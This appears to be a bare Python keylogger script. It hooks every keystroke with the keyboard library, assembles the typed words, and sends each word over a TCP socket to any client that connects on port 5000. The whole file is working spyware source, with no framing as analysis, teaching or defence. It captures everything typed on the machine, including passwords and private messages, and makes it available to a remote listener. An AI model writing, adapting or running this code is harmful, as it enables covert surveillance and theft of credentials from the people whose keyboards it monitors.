import keyboard
import socket


#Create Socket for the connection 
serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverSocket.bind(("", 5000))
serverSocket.listen()

 


#Create Socket for the connection 
clientSocket, clientAddress = serverSocket.accept()

word = ""

def LogginPulsation(pulsation):
    global word

    if pulsation.event_type == 'down':

        if len(pulsation.name) == 1:
            word += pulsation.name

        elif pulsation.name == 'backspace':
            word = word[:-1]

        elif pulsation.name == 'space' or pulsation.name == 'enter':
            try:
                word += "\n"
                clientSocket.sendall(word.encode())
                word = ""
            except Exception as e:
                print(f"Error sending data: {e}")

                


keyboard.hook(LogginPulsation)
keyboard.wait()

clientSocket.close()
serverSocket.close()

